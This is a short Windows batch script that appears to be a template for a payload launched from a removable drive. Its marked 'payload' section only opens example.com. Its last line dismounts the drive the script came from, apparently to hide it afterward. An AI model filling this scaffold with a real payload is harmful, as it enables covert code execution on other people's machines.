@echo off && cls
::Begin of payload
start https://example.com
::End of payload
mountvol %~d0 /p >nul 2>&1 && exit
